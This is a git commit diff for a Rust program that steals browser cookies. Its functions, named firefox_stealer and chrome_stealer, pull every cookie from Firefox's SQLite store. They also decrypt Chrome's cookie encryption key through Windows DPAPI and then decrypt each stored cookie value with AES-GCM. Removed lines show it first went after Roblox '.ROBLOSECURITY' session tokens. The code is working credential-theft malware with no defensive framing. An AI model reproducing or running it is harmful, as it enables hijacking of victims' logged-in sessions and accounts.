f10b1f8bd471640db916013e714ebf7ce5b64593
winneratwin <emmetthunstad@outlook.com>
2021-02-24 19:22:59 +0000

    split it into functions

--- src/main.rs
+++ src/main.rs
@@ -1,4 +1,4 @@
-use base64::{decode};
+use base64::decode;
 use platform_dirs::AppDirs;
 use serde_json;
 use sqlite::State;
@@ -19,41 +19,85 @@ fn _main() {
 }
 
 fn main() {
+    let mut total_cookies: Vec<Vec<String>> = Vec::new();
+    let mut ff_cookies = firefox_stealer();
+    let mut chrome_cookies = chrome_stealer();
+    total_cookies.append(&mut ff_cookies);
+    total_cookies.append(&mut chrome_cookies);
+    println!("{:?}", total_cookies);
+}
+
+fn firefox_stealer() -> Vec<Vec<String>> {
+    // returns vec with a vec of website,name,value
     // firefox
-    // quiry // select host, path, isSecure, expiry, name, value from moz_cookies
     // C:\Users\emmet\AppData\Roaming\Mozilla\Firefox\Profiles looking for a cookies.sqlite file
-    println!("Firefox");
+    let mut cookies: Vec<Vec<String>> = Vec::new();
     let app_dirs = AppDirs::new(Some(""), true).unwrap();
     let roaming = app_dirs.config_dir;
-    let local = app_dirs.cache_dir;
     let firefox_profile_path = roaming.join("Mozilla").join("Firefox").join("Profiles");
     if firefox_profile_path.is_dir() {
         for path in fs::read_dir(firefox_profile_path).unwrap() {
             let sqlite_db = path.unwrap().path().join("cookies.sqlite");
             if sqlite_db.exists() {
                 let connection = sqlite::open(sqlite_db).unwrap();
-                connection
-                    .iterate(
-                        "select host, path, isSecure, expiry, name, value from moz_cookies",
-                        |pairs| {
-                            //println!("fuck");
-                            if pairs[4].1 == Some(".ROBLOSECURITY") {
-                                println!("{:?}", pairs[5].1.unwrap());
-                            }
-                            // for &(column, value) in pairs.iter() {
-                            //     println!("{} = {}", column, value.unwrap());
-                            // }
-                            true
-                        },
-                    )
+                let mut statement = connection
+                    .prepare("SELECT host, name, value FROM moz_cookies")
                     .unwrap();
+                while let State::Row = statement.next().unwrap() {
+                    let mut cookie: Vec<String> = Vec::new();
+                    cookie.push(statement.read::<String>(0).unwrap());
+                    cookie.push(statement.read::<String>(1).unwrap());
+                    cookie.push(statement.read::<String>(2).unwrap());
+                    cookies.push(cookie);
+                }
             }
         }
     }
-    println!("chrome");
+    return cookies;
+}
+
+fn get_key(enc_key: &serde_json::Value) -> Vec<u8> {
+    let mut b_64_decoded =
+        decode(enc_key.as_str().unwrap()).expect("failed to decode base64 aes key");
+    b_64_decoded.remove(0);
+    b_64_decoded.remove(0);
+    b_64_decoded.remove(0);
+    b_64_decoded.remove(0);
+    b_64_decoded.remove(0);
+    let mut p_password_in = CRYPTOAPI_BLOB {
+        cbData: b_64_decoded.len() as u32,
+        pbData: b_64_decoded.as_mut_ptr(),
+    };
+    let mut p_password_out = CRYPTOAPI_BLOB::default();
+    let ppin = &mut p_password_in;
+    let pout = &mut p_password_out;
+    let mut dec_key: Vec<u8> = Vec::new();
+    unsafe {
+        let result = CryptUnprotectData(
+            ppin,
+            ptr::null_mut(),
+            ptr::null_mut(),
+            ptr::null_mut(),
+            ptr::null_mut(),
+            0,
+            pout,
+        );
+        if result == 1 {
+            let mut pass_decoded: Vec<u8> =
+                from_raw_parts(p_password_out.pbData, p_password_out.cbData as _).to_vec();
+            dec_key.append(&mut pass_decoded);
+        }
+    }
+    return dec_key;
+}
+
+fn chrome_stealer() -> Vec<Vec<String>> {
+    // returns vec with a vec of website,name,value
+    let mut cookies: Vec<Vec<String>> = Vec::new();
+    let app_dirs = AppDirs::new(Some(""), true).unwrap();
+    let local = app_dirs.cache_dir;
     let chrome_user_data_folder = local.join("Google").join("Chrome").join("User Data");
     let chrome_default_state = chrome_user_data_folder.join("Local State");
-
     let mut chrome_default_state_file =
         File::open(&chrome_default_state).expect("failed to open json key file");
     let mut chrome_default_state_contents = String::new();
@@ -63,18 +107,8 @@ fn main() {
     let key_file_json: serde_json::Value =
         serde_json::from_str(chrome_default_state_contents.as_str())
             .expect("JSON was not well-formatted");
-    let key64 = &key_file_json["os_crypt"]["encrypted_key"];
-    let mut b_64_decoded = decode(key64.as_str().unwrap()).expect("msg: &str");
-    b_64_decoded.remove(0);
-    b_64_decoded.remove(0);
-    b_64_decoded.remove(0);
-    b_64_decoded.remove(0);
-    b_64_decoded.remove(0);
-    //println!("{:?}", &b_64_decoded);
-
-    // use platform_dirs::AppDirs;
-    // let app_dirs = AppDirs::new(Some(""), true).unwrap();
-    // let local = app_dirs.cache_dir;
+    let enc_key = &key_file_json["os_crypt"]["encrypted_key"];
+    let dec_key = get_key(enc_key);
     let chrome_cookies = local
         .join("Google")
         .join("Chrome")
@@ -86,37 +120,8 @@ fn main() {
         let mut statement = connection
             .prepare("SELECT host_key,name,encrypted_value FROM cookies")
             .unwrap();
-
-        // statement.bind(1, 50).unwrap();
-        let mut p_password_in = CRYPTOAPI_BLOB {
-            cbData: b_64_decoded.len() as u32,
-            pbData: b_64_decoded.as_mut_ptr(),
-        };
-        let mut p_password_out = CRYPTOAPI_BLOB::default();
-        let ppin = &mut p_password_in;
-        let pout = &mut p_password_out;
-        let mut dec_password: Vec<u8> = Vec::new();
-        unsafe {
-            let result = CryptUnprotectData(
-                ppin, //pin,
-                ptr::null_mut(),
-                ptr::null_mut(),
-                ptr::null_mut(),
-                ptr::null_mut(),
-                0,
-                pout,
-            );
-            if result == 1 {
-                let mut pass_decoded: Vec<u8> =
-                    from_raw_parts(p_password_out.pbData, p_password_out.cbData as _).to_vec();
-                dec_password.append(&mut pass_decoded);
-                //println!("{:?}",dec_password);
-            }
-        }
-
-        let key = GenericArray::from_slice(&dec_password);
+        let key = GenericArray::from_slice(&dec_key);
         let cipher = Aes256Gcm::new(key);
-
         while let State::Row = statement.next().unwrap() {
             // println!("website = {}", statement.read::<String>(0).unwrap());
             // println!("name = {}", statement.read::<String>(1).unwrap());
@@ -124,28 +129,21 @@ fn main() {
             //     "enc value = {:?}",
             //     String::from_utf8_lossy(&statement.read::<Vec<u8>>(2).unwrap())
             // );
+            let mut cookie: Vec<String> = Vec::new();
+            cookie.push(statement.read::<String>(0).unwrap()); // website
+            cookie.push(statement.read::<String>(1).unwrap()); // name
             let enc_data = statement.read::<Vec<u8>>(2).unwrap();
             let nonce = GenericArray::from_slice(&enc_data[3..15]);
             let data_to_be_decrypted = &enc_data[15..];
-
-            println!("key: {:?}",key); // correct key cryptunprotec data worked
-            println!("full bytes: {:?}", &enc_data[..]);
-            println!("nonce: {:?}", &nonce);
-            println!("{:?}", &enc_data[15..].len());
-            println!("tag: {:?}", &enc_data[enc_data.len() - 16..].len());
             let plaintext = cipher
                 .decrypt(nonce, data_to_be_decrypted.as_ref())
                 .expect("decryption failure!");
-            println!("{:?}",String::from_utf8_lossy(&plaintext))
-            // iv = enc_data.Skip(3).Take(12).ToArray();
-            // payload = enc_data.Skip(15).ToArray();
-            // println!("{}", payload)
-            // Encoding.Default.GetString(Sodium.SecretAeadAes.Decrypt(payload, iv, dec_password));
+            cookie.push(String::from_utf8_lossy(&plaintext).into_owned()); // value
+            cookies.push(cookie);
+            // println!("{:?}", String::from_utf8_lossy(&plaintext))
         }
-    }
-
-    // \Google\Chrome\User Data\Local State
-    // \Google\Chrome\User Data\Default\Cookies
+    };
+    return cookies;
 }
 
 // everything else
